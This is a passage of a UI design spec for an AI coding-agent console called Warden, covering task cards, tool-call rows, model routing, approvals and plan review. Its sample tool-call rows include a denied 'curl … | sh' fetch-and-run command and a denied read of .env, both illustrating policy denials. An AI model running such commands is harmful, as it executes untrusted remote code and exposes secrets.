| Cancelled | "Cancelled" | §9.5 | §9.5 |
| Budget | "Budget reached" | §9.4 | §9.4 |

#### 10.3.4 TaskCard

The task entry body is a card: 1 px `color-border`, `radius-md`, background `color-surface-1`, padding `space-3`. Card inner width: 560 − 40 − 16 − 24 = 480 at `w1440`; 400 at `w1280`; 560 at `w1920`; up to 680 at `w1024`.

```
+------------------------------------------------------------------------------+
| implement   coder@1.0.0 · implement                    [Waiting for approval] |  row A 24
| Chosen: local/qwen-coder-32b [T0] because prefer-internal; internal data;     |  row B RoutingLine
| 3 candidates   Details                                                        |
| Step 9 / 60 · 01:42 paused · 84.2k in · 3.1k out · $0.00                      |  row C metrics
| › proc.exec npm install                                                       |  row D activity
| ▸ 23 tool calls · 1 approval pending · 0 denied                               |  row E summary
|   ! proc.exec  npm install                        approval pending · apr_9    |  pinned rows
|   +--------------------------------------------------------------------------+|
|   | ApprovalCard (§12)                                                       ||
|   +--------------------------------------------------------------------------+|
| [plan v1]                                                                     |  row F artifacts
+------------------------------------------------------------------------------+
```

| Row | Content | Source |
|---|---|---|
| A | Task key `mono-md` 600 ("plan", "implement", "verify", "repair-1", "verify-2", "summarize"); agent and mode `text-sm` `color-text-muted` ("coder@1.0.0 · implement", "verifier@1.0.0"); `StatusBadge taskState` right | `task.state` → `task_key`, `to`, `reason`; envelope `actor` |
| B | `RoutingLine` (§10.3.5) | `routing.decision`, `routing.fallback` |
| C | `mono-sm` `color-text-muted`: "Step 9 / 60" · elapsed (with "paused" while `waiting_for_*`, CF-38) · tokens in and out (k with one decimal) · cost ("$0.00"; "3 premium requests" for harnesses) | `model.call.start` → `step`; limit `max_steps` from `workflow.get` → `tasks[].limits` (ID-13); `model.call.end` → `usage` |
| D | Live activity (running only): "›" + last tool call ("proc.exec npm test") or "model step 9 · generating (212 tokens)"; `mono-sm`; replaced in place, never appended (no layout jump) | `tool.exec.start`; `stream.delta` (`kind: model_text` counted, not rendered) |
| E | Toggle button (28 high, `text-sm`): "▸ 23 tool calls · 1 approval pending · 0 denied"; expanded "▾" shows the last 8 `ToolCallRow`s and "Show all 23 in panel" | count of `policy.decision` with `call_id` in the task; approvals from `approval.requested`; denials `effect: deny` |
| Pinned rows | Always visible under E regardless of expansion: rows with `effect: deny`, rows with a pending approval, `sandbox.violation` rows | `policy.decision`, `approval.requested`, `sandbox.violation` |
| ApprovalCard | Inline, full card width, not collapsible while pending (§12) | `approval.requested` |
| F | Artifact chips 24 high, `mono-sm`: "plan v1", "code-diff v1", "code-diff (partial)", "test-report"; click selects the artifact in the panel | `artifact.created` → `type`, `partial`, `supersedes` |

Variants by task kind:

- **Verification** (`verify`, `verify-2`): row B (RoutingLine) appears only when the verifier model is called, which happens only to analyse failures (ID-09); when build and tests are green, row B reads "No model call: build and tests passed; analysis generated" (`color-text-muted`) and row C shows no tokens. Row D is replaced during running by the profile being run ("node-build · npx tsc --noEmit", then "node-test · npm test"); after completion a result row `text-sm`: "node-test · 42 passed · 1 failed · 6.9 s" with failed count in `color-state-failed`, and the first failure name under it (`mono-sm`, one line). Source: `artifact.created` (`test-report`) → `artifact.read` → `passed`, `failed`, `skipped`, `failures[0].name`, `duration_ms`.
- **Repair** (`repair-1`): an extra row under A: "Repair round 1 of 1 · 1 failing test"; an analysis excerpt `text-sm`, 2-line clamp, from `test-report.analysis` of the preceding verify, prefixed "Analysis:"; artifact chip "code-diff v2".
- **Harness task** (pinned `copilot`): row C shows "3 premium requests" instead of dollars; row B reads "Pinned: copilot (T4) · harness · split mode"; tool rows show executor "sandbox" as usual (Copilot split mode).

Task card states:

| State | Badge text and token | Card treatment | Rows shown |
|---|---|---|---|
| `queued` / `created` | "Queued" `color-text-muted` | normal | A |
| `running` | "Running" `color-state-running` | normal | A to F |
| `waiting_for_approval` | "Waiting for approval" `color-state-waiting` | border 1 px `color-effect-approval`; gutter icon pulses | A to F + ApprovalCard |
| `waiting_for_input` | "Needs input" `color-state-waiting` | border 1 px `color-state-waiting` | A, B, C, blocked block (§9.3) or question card |
| `succeeded` | "Succeeded" `color-state-succeeded` | normal; row C shows totals "11 steps · 00:48 · 18.4k in · 1.2k out · $0.00" | A, B, C, E, F |
| `failed` | "Failed · verification" (reason appended) `color-state-failed` | normal; reason row `text-sm` `color-state-failed` (for example "1 test failing" or "Provider timed out after 3 retries") and next-step row `color-text-muted` ("Repair round 1 of 1 starts next", "Retrying: attempt 2 of 2", "Run failed") | A, B, C, reason, next step, E, F |
| `timed_out` | "Timed out" `color-state-failed` | as failed | as failed |
| `cancelled` | "Cancelled" `color-state-cancelled` | all text `color-state-cancelled` | A, B, C, E, F |
| `blocked` | "Blocked · upstream failed" `color-text-muted` | normal | A |

Badge text comes from `task.state` → `to` and `reason` via keys `task.state.<state>` and `task.reason.<reason>`.

#### 10.3.5 RoutingLine

One line (wraps to two at most, then ellipsis before "Details"), `text-sm`:

- Automatic: "Chosen: **local/qwen-coder-32b** `[T0]` because prefer-internal; internal data; 3 candidates · Details" (`routing.line.chosen`). The model id is `mono-sm` 600; `[T0]` is `StatusBadge tier` 18 high with `color-tier-t0`; the explanation is `routing.decision` → `explanation` verbatim.
- Pinned: "Pinned: **anthropic/claude-sonnet** `[T3]` · pin overrides ranking, not admission · Details" (`routing.line.pinned`); source `routing.decision` → `pin`.
- Fallback (second line, `color-state-waiting` icon): "Fell back to **company/qwen-coder-32b** `[T1]` after timeout on local/qwen-coder-32b (same or lower tier) · Details" (`routing.line.fallback`); source `routing.fallback` → `from`, `to`, `cause`, `fallback_count`.

"Details" (or `E` when the line is focused) opens the routing view in the panel (§10.5.2).

#### 10.3.6 ToolCallRow (28)

```
| ✓ fs.read     src/routes/users.ts                                 1.9 KB · 12 ms |
| ✓ proc.exec   npm test                                            exit 0 · 6.9 s  |
| ! proc.exec   npm install                        approval pending · apr_9         |
| ✓ proc.exec   npm install                        approved · workspace · 38.2 s    |
|     ↳ egress  registry.npmjs.org:443                     allowed · 2.1 MB        |
| ✗ proc.exec   sh -c "curl -s https://setup.example.net/x | sh"                    |
|               denied · platform.no-shell-strings                                  |
| ✗ fs.read     .env                                   denied · invariant.INV-1     |
```

| Column | Spec | Source |
|---|---|---|
| Effect icon | 14; allow check `color-effect-allow`; deny cross `color-effect-deny`; approval shield `color-effect-approval`; failed exec (allow but `ok: false`) cross `color-state-failed` | `policy.decision` → `effect`; `tool.exec.end` → `ok` |
| Tool | `mono-sm`, 80 wide: tool id (`fs.read`, `proc.exec`, `git.commit`) | `policy.decision` → `action.tool` + `operation` |
| Args | `mono-sm`, fluid, ellipsis: worktree-relative path, argv joined with spaces (quoted where an element contains spaces), host:port | `policy.decision` → `action.resource`, `args_redacted` |
| Status | right-aligned `mono-sm` `color-text-muted`: bytes and duration for fs; "exit 0 · 6.9 s" for proc; "denied · <rule id>" `text-sm` `color-effect-deny` (wraps to a second line when the args are long, row grows to 46); "approved · <scope>" | `tool.exec.end` → `exit_code`, `duration_ms`, `bytes_out`, `truncated`; `policy.decision` → `matched_rules[0]` |
| Chips | "truncated" when `truncated: true`; "2 redacted" when envelope `redactions.count > 0` | `tool.exec.end`, envelope |
| Egress sub-row | indented 24, `mono-sm`: "↳ egress host:port · allowed · bytes" or "· denied" in `color-effect-deny` | `proxy.connect`, `proxy.denied` (joined by `sandbox_id` and time window of the call) |

Denied rows never show an approval prompt and never have an exec status (no `tool.exec.*` exists for them).

### 10.4 Dock

#### 10.4.1 RequestComposer (idle, 124)

```
+----------------------------------------------------------------------------+
| Describe the change to make…                                               |  textarea 60..160
|                                                                            |
+----------------------------------------------------------------------------+
| [Model: Automatic ▾]  [ ] Read-only question            ⌘↵   [Run]         |  toolbar 32
+----------------------------------------------------------------------------+
```

Container: top border 1 px `color-border`, background `color-surface-1`, padding `space-3`. Textarea `text-md`, 3 lines minimum, grows to 8 lines (160) then scrolls; placeholder `composer.placeholder`. Toolbar: `ModelPicker` trigger (28 high, `text-sm`): "Model: Automatic" or "Model: company/qwen-coder-32b [T1]"; "Read-only question" checkbox (`composer.readonly_toggle`; sends `kind: readonly`, CF-43); key hint `mono-sm`; primary "Run" button (32). Run is disabled with a reason tooltip when: text empty; ST-1 (`composer.disabled.no_provider`); ST-2 (`state.sandbox_missing.action_disabled`); pin inadmissible (`composer.pin_inadmissible`, with inline "Use automatic routing" link). Submit: `session.request {session_id, text, pin_model, kind}`. After submit the composer is replaced by the `RunStatusStrip`; the text is kept in the Request entry, not in the composer.

#### 10.4.2 RunStatusStrip (run active, 40)

`text-sm`: state dot + "Run 1 · implement · step 9 / 60 · waiting for approval" (or "Waiting for you: Plan review (G1)", link "Review") + right "Cancel run ⌘." (secondary danger, 28). Clicking the text scrolls to and focuses the active entry. Source: latest `task.state`, `model.call.start.step`, `workflow.gate.presented`.

#### 10.4.3 ModelPicker

Popover anchored above the trigger, width 420, max height 440 (scrolls), `elevation-2`, `radius-md`. Opens with a click or `Enter` on the trigger; arrow keys move; `Enter` selects; `Esc` closes. Source: `provider.models {session_id}` → `models[{model_id, provider_id, tier, admissible, reason_code, reason, capabilities, pricing, quality_prior}]`, refreshed on `workspace.classification` and `provider.configured` events.

Structure:

1. "Automatic" row (48): "Automatic (router)" + `modelpicker.automatic` ("Picks per task: prefer-internal; verify cost-first"). Selected by default.
2. Section header (24, `text-xs` 600 `color-text-muted`): "Admissible for internal data" (`modelpicker.section.admissible`, classification interpolated).
3. Admissible rows (48 each), in router order.
4. Section header: "Not admissible for confidential data" (`modelpicker.section.not_admissible`), only when there are inadmissible rows.
5. Greyed rows (56 each: two lines plus reason).

Row layout (admissible):

```
| company/qwen-coder-32b   [T1]   company-vllm                      0.00 · hosted |
| tool calling native · 32k context · priors plan .6 implement .55                |
```

Line 1: model id `mono-md`; `StatusBadge tier`; provider id `text-sm` `color-text-muted`; price right `mono-sm` ("$3.00 / $15.00 per Mtok" for priced, "0.00 · local" for T0, "0.00 · hosted" for T1, "quota · premium requests" for harnesses). Line 2 `text-xs` `color-text-muted`: capabilities and priors. Harness rows add `modelpicker.harness_pin_only` ("Harness: runs only when pinned"). Rows with `quality_prior.plan` below 0.5 add `modelpicker.below_threshold` ("Below quality threshold for plan; the router ranks it last").

Row layout (greyed, `aria-disabled="true"`, focusable so the reason is read):

```
| anthropic/claude-sonnet   [T3]   anthropic                   $3.00 / $15.00 |   color-text-muted
| ⊘ Not admissible for confidential data: T0, T1, T2 only   tier_not_admitted |   color-effect-deny icon
```

Reason line: icon 12 `color-effect-deny`, text from `routing.reason.<reason_code>` with the API's `reason` as fallback, and the code `mono-sm` right-aligned. Greyed rows cannot be selected; clicking one shows the reason in a tooltip.

Canonical content, workspace `internal`:

| Row | Tier | Note |
|---|---|---|
| Automatic (router) | | selected |
| local/qwen-coder-32b | T0 | 0.00 · local |
| company/qwen-coder-32b | T1 | 0.00 · hosted (present once configured, WRD-16 §3 step 7) |
| anthropic/claude-sonnet | T3 | $3.00 / $15.00 per Mtok |
| local/qwen-coder-7b | T0 | below threshold for plan |
| copilot | T4 | Harness: runs only when pinned · quota |

Canonical content after switching to `confidential`:

| Section | Row | Tier | Reason |
|---|---|---|---|
| Admissible for confidential data | Automatic (router) | | |
| | local/qwen-coder-32b | T0 | |
| | company/qwen-coder-32b | T1 | |
| | local/qwen-coder-7b | T0 | below threshold for plan |
| Not admissible for confidential data | anthropic/claude-sonnet | T3 | Not admissible for confidential data: T0, T1, T2 only · `tier_not_admitted` |
| | copilot | T4 | Not admissible for confidential data: T0, T1, T2 only · `tier_not_admitted` |

Other reason codes use the same row pattern with their key (`routing.reason.capability_missing`, `context_too_small`, `denied_by_policy`, `over_budget`, `circuit_open`, `harness_not_pinned` (never shown as greyed in the picker, since pinning is the remedy), `harness_disabled`, `harness_locked_shared_mode`, `provider_unconfigured`, `credential_missing`).

Empty admissible section (ST-3 before a run): the section shows `state.no_admissible.body` and two links "Add local model", "Add company-hosted model" (`/setup/local`, `/setup/company`).

### 10.5 ContextPanel

#### 10.5.1 Panel frame

Header (56, sticky, bottom border): entry title `text-lg` 600; subtitle `text-sm` `color-text-muted` with ids (`mono-sm`, copy on click); state badge right; close button at `w1024`. Body scrolls. A "CLI" disclosure (collapsed, `mono-sm`) sits at the end of every view with the equivalent command (B01 §10). Views by selection:

| Selection | Panel view | Sections / tabs |
|---|---|---|
| Request | Request | Text, classification at submission, kind, pin, run id, text hash |
| Routing line | Routing (§10.5.2) | Decision summary, candidates table, fallback history |
| Task card | Task | Tabs: Overview · Tool calls · Model calls · Context · Artifacts · Events |
| Tool call | Tool call (§10.5.3) | Action · Decision · Execution · Output · Network |
| Approval | Approval (§12.3) | Card · Decision · Explain · Grant |
| Gate G1 | Plan provenance (§11.1) | Routing view of the plan task, artifact metadata, v1/v2 comparison after an edit |
| Gate G2 | switches to review layout (§13) | |
| Artifact | Artifact | Metadata (type, version, size, hash, partial, supersedes), provenance (model, routing event, tool calls count, approvals), content viewer (`PlanCard`, `DiffViewer`, `TestReport`, JSON) |
| System line | Event | Payload fields |

Task tabs: Overview (state history table from `task.state`: time, from → to, reason, attempt; limits; sandbox id and level from `sandbox.create`), Tool calls (full `ToolCallRow` list, virtualized, filter chips All / Denied / Approvals / Failed), Model calls (table: step, model, tier, input, output, cached tokens, latency, TTFT, stop reason, cost; from `model.call.start/end`), Context (per step: sources from `context.assembled.sources[{kind, ref, trust, tokens}]` with untrusted sources in a `color-untrusted` left border and label "untrusted"; total vs budget tokens; compactions from `context.compacted`), Artifacts, Events (`EventLog` filtered by `task_id`).

#### 10.5.2 Routing view

```
Routing for implement · rt_01JAXRD…                              prefer-internal
Chosen: local/qwen-coder-32b [T0] because prefer-internal; internal data; 3 candidates
Classification internal · strategy prefer-internal · pin none · budget remaining $5.00

MODEL                     TIER  STATUS     REASON                                  PRIOR  EST. COST
local/qwen-coder-32b      T0    chosen     internal, prior 0.55 ≥ 0.5              0.55   $0.00
anthropic/claude-sonnet   T3    admitted   ranked after internal models            0.90   $0.41
local/qwen-coder-7b       T0    admitted   prior 0.25 below threshold 0.5           0.25   $0.00
copilot                   T4    rejected   harness_not_pinned                      n/a    n/a
```

Sources: `routing.decision` → `routing_id`, `task_class`, `classification`, `strategy`, `pin`, `budget_remaining_usd`, `explanation`, `candidates[{model_id, tier, status, reason_code, reason, quality_prior, est_cost_usd}]`. Status cells use `color-state-succeeded` (chosen), `color-text` (admitted), `color-effect-deny` (rejected), `color-state-waiting` (unhealthy). Fallback history below: one row per `routing.fallback` (from, to, cause, count). Est. costs are illustrative in this example.

#### 10.5.3 Tool call view

Order is fixed: the decision is shown above the effect.

1. **Action**: tool and operation, resource (path, argv, host), risk class chip ("R4"), executor ("sandbox sb_…" / "host" / "harness"). Source `policy.decision` → `action`, `tool.exec.start` → `executor`, `sandbox_id`.
2. **Decision**: effect badge (`StatusBadge effect`), reason sentence, matched rules as `mono-sm` chips with layer ("L3 user.package-install"), obligations (for example "egress_allow: registry.npmjs.org:443 +4"), decision ids. When approval was involved, two stacked decisions: "approval_required (dec_…)" then "allow, resolved by apr_9 (dec_…)" (CF-40). "Explain" (`E`) opens the `ExplainDrawer` with `policy.explain {tool, operation, resource, session_id}` → `layers[{layer, rule_id, effect}]`.
3. **Execution**: exit code, duration, bytes out, truncated flag, error. Source `tool.exec.end`.
4. **Output**: header "Output · untrusted" with `color-untrusted` label (`toolcall.untrusted_output`); `mono-sm` viewer (max 400 lines, "Load more" by `artifact.read {range}`), streaming via `stream.delta {kind: tool_output}` while running; redaction markers `[REDACTED:<type>]` shown as chips. Source `artifact.read` on `output_ref` (ASM).
5. **Network**: `proxy.connect` / `proxy.denied` rows of the call's sandbox during the call.

For denied calls: sections 3 to 5 are replaced by one line `toolcall.denied` ("Not executed. The model was told the call was denied.") and, for invariants, `policy.layers.<INV-id>`.

### 10.6 Canonical snapshot at 1440 during implement (pending approval selected)

```
+----------------------------------------------------------------------------------------------------------------------+
| Warden  Workspaces › ts-express-api › Session 01JAXR8Q                                               (•) Live [⋯] |
+----+-----------------------------------------------------------------------------------------------------------------+
| WS | ts-express-api        [internal▾] [L1 · Seatbelt] [Chain: unverified▾] [Agents can: read/write this…▾]           |
| ST | warden/01jaxr8q… · base 7c1e9b2                         [1 pending]  $0.00 / $5.00   [Cancel run ⌘.]      |
| DR +----------------------------------------------------+-----------------------------------------------------------+
|    | Run 1 · Add a GET /users/:id endpoint…  Waiting 03:02| Approval · apr_9                         [Waiting]       |
|    |----------------------------------------------------| coder@1.0.0 · implement · call_31 · dec_01JAXRE…          |
|    | ● Request                                  10:02:11 |-----------------------------------------------------------|
|    |   Add a GET /users/:id endpoint returning the user | Package install needs approval             R4 · 10:07:31 |
|    |   or 404, with tests.                              | What   npm install                                        |
|    |   [internal] [change]                              |        in the worktree root · adds egress to              |
|    | · Session branch warden/01jaxr8q… created from 7c1e9b2|     registry.npmjs.org:443 (+4 registry hosts)        |
|    | ✓ plan   coder@1.0.0 · plan             [Succeeded] | Who    coder@1.0.0 · task implement · step 9 · Run 1      |
|    |   Chosen: local/qwen-coder-32b [T0] because         | Why    Egress to registry.npmjs.org:443 is not in the     |
|    |   prefer-internal; internal data; 3 candidates     |        task allowlist.                                    |
|    |   11 steps · 00:48 · 18.4k in · 1.2k out · $0.00   |        rule user.package-install · risk R4 (install)      |
|    |   ▸ 31 tool calls · 0 approvals · 0 denied         | Scope  [1 Once][2 Task][3 Session][4 Workspace*]          |
|    |   [plan v1]                                        |        * preselected: same pattern in ts-express-api …    |
|    | ✓ Gate G1 · Plan approved                  10:03:40 |-----------------------------------------------------------|
|    |   by you · plan v1                                 | Decision                                                  |
|    | ◉ implement  coder@1.0.0 · implement  [Waiting for approval]| approval_required · L3 user.package-install · dec_… |
|    |   Chosen: local/qwen-coder-32b [T0] because         | obligations: egress_allow registry.npmjs.org:443 +4       |
|    |   prefer-internal; internal data; 3 candidates     | Explain (E): L3 user.package-install approval_required,   |
|    |   Step 9 / 60 · 01:42 paused · 84.2k in · 3.1k out | scope max workspace (policy.explain layers)               |
|    |   ▸ 23 tool calls · 1 approval pending · 0 denied  | Grant preview: workspace → install pattern, until revoked |
|    |   ! proc.exec npm install    approval pending · apr_9| CLI  warden approve apr_9 --scope workspace            |
|    |   +----------------------------------------------+ |-----------------------------------------------------------|
|    |   | Package install needs approval  R4 · 10:07:31| | Explain E                        [Reject R] [Approve A]   |
|    |   | npm install · adds registry egress           | +-----------------------------------------------------------+
|    |   | coder · implement · step 9                   |                                                            |
|    |   | Egress to registry.npmjs.org:443 is not in … |                                                            |
|    |   | [1 Once][2 Task][3 Session][4 Workspace]     |                                                            |
|    |   | Explain E              [Reject R] [Approve A] |                                                            |
|    |   +----------------------------------------------+                                                            |
|    |----------------------------------------------------|                                                            |
|    | ◉ Run 1 · implement · step 9/60 · waiting for approval  [Cancel run ⌘.]                                         |
+----+----------------------------------------------------+-----------------------------------------------------------+
```

### 10.7 Timeline after verify-2 (G2 open), canonical sequence

| # | Entry | Visible text (abbreviated) |
|---|---|---|
| 1 | Request | "Add a GET /users/:id endpoint returning the user or 404, with tests." `[internal] [change]` |
| 2 | System | "Session branch warden/01jaxr8q… created from 7c1e9b2" |
| 3 | Task plan | Succeeded · local/qwen-coder-32b [T0] · 11 steps · 00:48 · $0.00 · 31 tool calls |
| 4 | Gate G1 | Plan approved · by you · plan v1 |
| 5 | Task implement | Succeeded · local/qwen-coder-32b [T0] · 27 steps · 03:12 · $0.00 · 46 tool calls · 1 approval (apr_9, workspace) · [code-diff v1] |
| 6 | Task verify | Failed · verification · node-test · 42 passed · 1 failed · "GET /users/:id returns 404 for unknown id" · "Repair round 1 of 1 starts next" |
| 7 | Task repair-1 | Succeeded · "Repair round 1 of 1 · 1 failing test" · "Analysis: the route returns 200 with an empty body when findUserById returns undefined; add a 404 branch in src/routes/users.ts." · 9 steps · 01:05 · [code-diff v2] |
| 8 | Task verify-2 | Succeeded · node-test · 43 passed · 0 failed · 6.8 s · no model call (ID-09) |
| 9 | Gate G2 | Result review · Waiting for you · "4 files +86 −3 · 43 passed · $0.00 · chain verified" · [Review result] |

### 10.8 Region states (SCR-2)

| Region | Loading | Streaming / running | Waiting | Failed | Cancelled | Disconnected |
|---|---|---|---|---|---|---|
| Timeline | Skeleton entries during replay; `RunHeader` shows "Loading events…" | New entries append at the bottom; if the user has scrolled up more than 200 px, no auto-scroll and a "New activity ↓" pill (28) appears at the bottom center | Waiting entry pulses (reduced motion: static); `RunStatusStrip` states what waits | Failed card in place; run header badge failed | Run group greyed (§9.5) | Entries stay; connection Banner; on reconnect, or on an `event.gap` notification (subscription overflow, ID-13), the UI resubscribes with `after_seq` = last seen `seq` and fills the gap |
| TaskCard | n/a | Rows C and D update in place at most 4 times per second (B05) | See task states | See task states | See task states | Last known values, activity row shows "No live updates" |
| ContextPanel | Skeleton sections | Output view streams | Approval or gate view with actions | Error details | Read-only | Actions disabled with `error.daemon_disconnected` tooltip |
| Dock | Composer disabled until `session.open` resolves | `RunStatusStrip` | `RunStatusStrip` with "Waiting for you" | Composer returns (Iterate) | `ResumeBar` | Composer disabled |
| Header | Badges show "…" | Cost updates on each `model.call.end` | same | same | Cancel control hidden after `workflow.end` | Connection dot red |

### 10.9 Responsive behavior (SCR-2)

| Aspect | `w1920` | `w1440` | `w1280` | `w1024` |
|---|---|---|---|---|
| Columns | 640 + fluid panel | 560 + fluid | 480 + fluid | timeline only; panel is a 480 drawer |
| TaskCard inner width | 560 | 480 | 400 | ≤ 680 |
| RoutingLine | one line | usually two lines | two lines | one line (wide timeline) |
| ToolCallRow status column | inline | inline | wraps under args when > 50 % width | inline |
| Capability chip | text 360 | text 360 | text 280 | icon only |
| Branch line | shown | shown | shown | hidden |
| ModelPicker | 420 popover | 420 | 420 | 420 |
| Approval and G1 actions | inline card / sticky GateBar, repeated in the panel for approvals | same | same | inline card / sticky GateBar; the drawer repeats approval actions only when opened |

## 11. SCR-3 Plan review, G1 (high fidelity)

### 11.1 Placement

SCR-3 is the session route `/sessions/:sid/runs/:rid/gate/plan`. The full `PlanCard` renders inline as the body of the Gate G1 entry in the timeline (WRD-16 §13 screen 3: "inline text edit"), and the `GateBar` is sticky at the bottom of the timeline column, directly above the dock, so the gate actions stay visible while the user scrolls back through the evidence (B04 C-13, B05 §7.1). When the gate entry is selected, the context panel shows the plan's provenance: the plan task's routing view (§10.5.2), artifact metadata (`artifact.get`), and, after an edit, a side-by-side text comparison of plan v1 and v2. On arrival of `workflow.gate.presented {gate_key: gate-plan}` the entry is appended and announced, the `RunStatusStrip` reads "Waiting for you: Plan review (G1)", and focus does not move (B05 §7.1); the user reaches the gate with `G` then `A`, the badge, a click or `J`/`K`, and the route `/gate/plan` (notification click) scrolls to the entry and focuses it (B05 §3.2).

Inline PlanCard width equals the task card inner width (§10.3.4): 560 at `w1920`, 480 at `w1440`, 400 at `w1280`, up to 680 at `w1024`.

### 11.2 PlanCard (read mode) with canonical content

```
 ◉ Gate G1 · Plan review                                              [Waiting for you]
 +----------------------------------------------------------------------------------+
 | Model   local/qwen-coder-32b [T0] · Chosen because prefer-internal; internal      |
 |         data; 3 candidates · Details                                             |
 |                                                                                  |
 | Summary                                                                          |
 | Add a GET /users/:id route that returns the user as JSON or 404 when no user     |
 | matches, backed by a new findUserById service function, with route and service  |
 | tests.                                                                           |
 |                                                                                  |
 | Steps (2)                                                                        |
 | (1) Add findUserById to the user service                                         |
 |     src/services/userService.ts   test/services/userService.test.ts              |
 |     The route needs a lookup that returns undefined for unknown ids instead of   |
 |     throwing.                                                                    |
 | (2) Add GET /users/:id with 404 handling                                         |
 |     src/routes/users.ts   test/routes/users.test.ts                              |
 |     Register the handler on the existing users router and cover 200 and 404     |
 |     with supertest.                                                              |
 |                                                                                  |
 | Expected files (4)                                                               |
 |     src/routes/users.ts · src/services/userService.ts · test/routes/users.test.ts |
 |     · test/services/userService.test.ts                                          |
 |                                                                                  |
 | Risks (2)                                                                        |
 |  !  The error middleware formats 404 bodies as { error: "not_found" }; the route |
 |     must use it rather than a custom body.                                       |
 |  !  test/routes/users.test.ts mocks userService; the mock must gain findUserById |
 |     or existing tests break.                                                     |
 |                                                                                  |
 | Estimate  2 steps · $0.00 · local model; infrastructure cost not tracked         |
 +----------------------------------------------------------------------------------+
 ...
 +-------------------------------------------------------------------------------------+  GateBar 64
 | Gate G1 · Nothing changes before you approve.  [Approve plan A] [Edit plan ⌘E] [Reject R] [Cancel run ⌘.]  Explain E |
 +-------------------------------------------------------------------------------------+
```

| Element | Spec | Source |
|---|---|---|
| Entry title row | Gate icon, "Gate G1 · Plan review" `text-md` 600, state badge "Waiting for you" `color-state-waiting`; meta: plan version and artifact id (`mono-sm`, copyable) | `workflow.gate.presented` → `gate_id`, `artifacts[]`; `artifact.get` → `version` |
| Card frame | 1 px `color-effect-approval` border (open gate), `radius-md`, `color-surface-1`, padding `space-4` | gate open |
| Model block | Label column 64 wide `text-sm` `color-text-muted`; value is the plan task's `RoutingLine`; "Details" or `E` opens the `ExplainDrawer` with the routing view | `routing.decision` of the `plan` task |
| Section labels | `text-sm` 600 `color-text-muted`, `space-5` above, `space-2` below; sentence case | static |
| Summary | `text-md` `color-text` | plan → `summary` |
| Steps | Ordered list; number in a 22 px circle (`mono-sm`, `color-surface-3`); title `text-md` 600; files as `mono-sm` chips (22 high, `radius-sm`, `color-surface-2`, gap `space-2`, wrap); rationale `text-sm` `color-text-muted`; `space-4` between steps | plan → `steps[{title, files[], rationale}]` |
| Expected files | Count in the label; `mono-sm` list separated by " · ", wraps | plan → `expected_files[]` (CF-32) |
| Risks | Icon "!" 14 `color-effect-approval`; `text-sm` paragraphs | plan → `risks[]` |
| Estimate | `text-sm`: "2 steps · $0.00" + `cost.local_note` when the plan model is T0 or T1; priced models show "$0.07 estimated" | plan → `estimate{steps, cost_usd}`; tier from the plan task's `routing.decision` |
| GateBar | Sticky, 64 high, `elevation-2`, `color-surface-1`, 3 px `color-effect-approval` top stripe; left `text-sm` "Gate G1" + `gate.g1.subtitle` (hidden below 1180); buttons: "Approve plan" primary (`A`), "Edit plan" (`Mod+E`), "Reject" (`R`, opens the inline confirmation), "Cancel run" (`Mod+.`), then an "Explain" link (`E`); key hints inside labels; at `w1280` the buttons are compact (28) and "Explain" becomes an icon | `workflow.resolveGate`, `session.cancel` |

The CLI equivalent (`warden approve tsk_01JAXRC…`, `warden reject tsk_01JAXRC…`) is in the panel's CLI disclosure and in the GateBar buttons' tooltips.

### 11.3 Edit mode

`Mod+E` or "Edit plan" turns the inline PlanCard into an editor in place (B05 §7.2 is authoritative for rules and keys); the entry badge becomes "Editing"; an info line `plan.intentNote` (B05) states that file lists describe intent and do not grant permissions (BI-5).

```
 +----------------------------------------------------------------------------------+
 | 2 problems: Step 2 title is required · Step 2 path "../x" leaves the worktree     |  error summary
 | File lists describe intent; they do not grant permissions.                        |  intent note
 | Summary                                                             1,204 / 2,000 |
 | [ Add a GET /users/:id route that returns the user as JSON or 404 when …        ] |
 | (1) Title  [ Add findUserById to the user service                    ] [↑][↓][✕]  |
 |     Files  [ src/services/userService.ts                                        ] |
 |            [ test/services/userService.test.ts                                  ] |
 |     Why    [ The route needs a lookup that returns undefined for unknown ids …  ] |
 | (2) …                                                                             |
 | [+ Add step]                                                                      |
 | Expected files (4, from steps)  src/routes/users.ts · …                           |
 | Risks and estimate come from the original plan and are not editable.              |
 +----------------------------------------------------------------------------------+
 GateBar: Editing plan · 2 steps · 2 problems        [Save and approve ⌘↵]  [Discard edits Esc]
```

| Control | Size | Rule (B05 §7.2) |
|---|---|---|
| Summary | textarea, 3 to 10 rows, full card width, counter `mono-sm` right-aligned above | required, ≤ 2,000 chars |
| Step title | input 32 high, fluid | required, ≤ 200 chars |
| Step files | textarea, one path per line, 2 to 8 rows | 0 to 50 worktree-relative paths; no leading `/` or `~`, no `..`, no globs |
| Step rationale | textarea, 2 to 6 rows | ≤ 1,000 chars |
| Move up / down / Remove | icon buttons 28 × 28 (`Alt+Shift+↑/↓` for moves) | Remove disabled when one step remains |
| Add step | text button | 1 to 20 steps |
| Expected files | read-only line, recomputed live as the union of step files | CF-32 |
| Error summary | top of the card, `color-state-failed` text, each problem a link to its field | shown while errors exist |

"Save and approve" (`Mod+Enter`) calls `workflow.resolveGate {run_id, gate_id, decision: approve, edited_artifact: <plan JSON>}` (edited summary and steps, recomputed `expected_files`, unchanged `risks` and `estimate`); events `artifact.edited`, `workflow.gate.resolved {edited_artifact}`. "Discard edits" (`Esc`) asks inline only when there are unsaved edits. Reject stays available (it discards the draft).

### 11.4 States

| State | Presentation |
|---|---|
| Open | as §11.2; gutter icon pulses; the `PendingApprovalBadge` gate segment shows "G1 open" |
| Reject confirmation | Inline in the GateBar (not modal): "Reject the plan and end this run?" with optional comment, [Reject plan] (`Enter`) and [Keep reviewing] (`Esc`) (B05 §2.6) |
| Sending | the pressed button shows a spinner and "Sending…"; all gate buttons disabled; no optimistic change in the timeline (B05 §5) |
| Approved | GateBar collapses into the entry's title row: "Plan approved by you · 10:03:40" (or "with edits", linking both versions); the card collapses to summary, step count and expected files |
| Approved elsewhere | "Resolved from the CLI by local:robert"; an open editor closes and keeps the draft in a read-only "Your unsaved edits" block (B05 §7.3) |
| Rejected | entry title "Plan rejected by you" plus the comment; run `cancelled`, reason `rejected` (ID-01), shown with ST-5 treatment without Resume (no approved gate); composer returns with the request text |
| Cancelled | "Run cancelled; the plan was not approved" |
| Expired | "Gate expired after 24 h" (`timed_out`) |
| Error | `invalid_state` (-32003): inline `error.rpc.invalid_state` and refresh from events; edit rejected by the runtime: error at the top of the editor, draft kept |
| ST-2 active | "Approve plan" and "Save and approve" disabled with `st.2.body` as description; Edit, Reject and Cancel stay enabled |

## 12. SCR-4 Approval prompt (high fidelity)

